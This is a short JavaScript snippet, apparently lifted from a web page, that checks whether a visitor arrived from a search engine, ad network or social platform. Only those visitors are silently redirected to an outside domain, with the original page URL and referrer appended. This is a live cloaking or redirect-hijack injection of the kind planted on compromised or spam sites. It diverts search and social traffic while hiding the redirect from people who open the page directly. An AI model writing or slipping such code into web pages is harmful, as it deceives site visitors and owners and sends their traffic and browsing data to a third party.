  //<![CDATA[
var ars = 'https://www.yama.my.id';

if(['.google.', 'bing.', 'yandex.', '.doubleclick.', '.googleadservices.', '.ampproject.', 'facebook.', 'pinterest.', 'blogspot.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
